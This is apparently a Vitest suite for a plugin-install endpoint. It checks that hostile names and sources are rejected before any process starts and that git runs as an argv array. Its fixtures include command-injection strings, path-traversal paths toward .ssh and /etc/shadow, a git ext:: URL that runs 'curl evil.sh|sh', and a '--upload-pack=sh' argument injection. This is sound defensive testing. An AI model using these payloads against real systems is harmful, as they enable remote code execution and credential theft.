import { describe, it, expect, beforeEach, vi } from 'vitest';

/**
 * The property that matters: hostile input must never reach a process. So this
 * suite intercepts the spawn itself and asserts (a) that nothing is spawned for
 * a malicious body, and (b) that when git IS spawned it is spawned as
 * execFile('git', [argv…]) — an argv array, never a command string. That is what
 * makes shell metacharacters inert, so it is the thing worth pinning.
 *
 * Nothing here mocks the validation under test; install-guard runs for real.
 */

const execFileMock = vi.fn(
  (
    _file: string,
    _args: string[],
    _opts: unknown,
    cb: (e: Error | null, r: { stdout: string; stderr: string }) => void,
  ) => cb(null, { stdout: '', stderr: '' }),
);

vi.mock('child_process', () => ({ execFile: execFileMock }));

// Keep the suite off the real ~/.claude/plugins.
vi.mock('os', async (orig) => {
  const actual = await orig<typeof import('os')>();
  return { ...actual, homedir: () => '/tmp/aime-install-test-home' };
});

beforeEach(() => {
  execFileMock.mockClear();
});

const post = async (body: unknown) => {
  const { POST } = await import('./route');
  return POST(
    new Request('http://localhost/api/mcp/install', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    }),
  );
};

describe('POST /api/mcp/install — nothing spawns for hostile input', () => {
  const hostileNames = [
    '$(id)',
    '`id`',
    'a;id',
    'a|id',
    '../../../.ssh',
    '..',
    'a/b',
    '.hidden',
    '-flag',
  ];

  it.each(hostileNames)('rejects name %j without spawning anything', async (name) => {
    const res = await post({ name, source: { source: 'github', repo: 'o/r' } });
    expect(res.status).toBe(400);
    expect(execFileMock).not.toHaveBeenCalled();
  });

  const hostileSources = [
    { source: 'url', url: 'ext::sh -c "curl evil.sh|sh"' },
    { source: 'url', url: 'file:///tmp/evil' },
    { source: 'url', url: 'git@github.com:o/r.git' },
    { source: 'url', url: 'https://user:pw@github.com/o/r.git' },
    { source: 'github', repo: '../../evil' },
    { source: 'github', repo: 'o/r', ref: '--upload-pack=sh' },
    { source: 'git-subdir', url: 'https://h/r.git', path: '../../../etc' },
    { source: 'exec', url: 'https://h/r.git' },
    '../../../etc/shadow',
  ];

  it.each(hostileSources)('rejects source %j without spawning anything', async (source) => {
    const res = await post({ name: 'ok-name', source });
    expect(res.status).toBe(400);
    expect(execFileMock).not.toHaveBeenCalled();
  });

  it('rejects a missing name or source', async () => {
    expect((await post({ source: { source: 'github', repo: 'o/r' } })).status).toBe(400);
    expect((await post({ name: 'x' })).status).toBe(400);
    expect(execFileMock).not.toHaveBeenCalled();
  });
});

describe('POST /api/mcp/install — how git is invoked', () => {
  it('spawns git with an argv array, not a command string', async () => {
    await post({ name: 'my-plugin', source: { source: 'github', repo: 'anthropics/x', ref: 'main' } });

    expect(execFileMock).toHaveBeenCalledTimes(1);
    const [file, args] = execFileMock.mock.calls[0];
    expect(file).toBe('git');
    expect(Array.isArray(args)).toBe(true);
    expect(args).toEqual([
      'clone',
      '--depth',
      '1',
      '--single-branch',
      '--branch',
      'main',
      '--',
      'https://github.com/anthropics/x.git',
      '/tmp/aime-install-test-home/.claude/plugins/my-plugin',
    ]);
  });

  it('disables git credential prompting so a bad URL cannot hang the request', async () => {
    await post({ name: 'p2', source: { source: 'github', repo: 'o/r' } });
    const opts = execFileMock.mock.calls[0][2] as { env: Record<string, string>; timeout: number };
    expect(opts.env.GIT_TERMINAL_PROMPT).toBe('0');
    expect(opts.timeout).toBeGreaterThan(0);
  });

  it('clones into a path confined to the plugins directory', async () => {
    await post({ name: 'p3', source: { source: 'github', repo: 'o/r' } });
    const args = execFileMock.mock.calls[0][1];
    const targetDir = args[args.length - 1];
    expect(targetDir.startsWith('/tmp/aime-install-test-home/.claude/plugins/')).toBe(true);
    expect(targetDir).not.toContain('..');
  });

  it('does not leak git stderr to the caller', async () => {
    execFileMock.mockImplementationOnce((_f, _a, _o, cb) =>
      cb(new Error('fatal: could not read /Users/someone/.ssh/id_rsa'), { stdout: '', stderr: '' }),
    );
    const res = await post({ name: 'p4', source: { source: 'github', repo: 'o/r' } });
    expect(res.status).toBe(500);
    expect(await res.json()).toEqual({ error: 'Install failed' });
  });

  it('rejects a non-JSON body', async () => {
    const { POST } = await import('./route');
    const res = await POST(
      new Request('http://localhost/api/mcp/install', { method: 'POST', body: 'nope' }),
    );
    expect(res.status).toBe(400);
    expect(execFileMock).not.toHaveBeenCalled();
  });
});
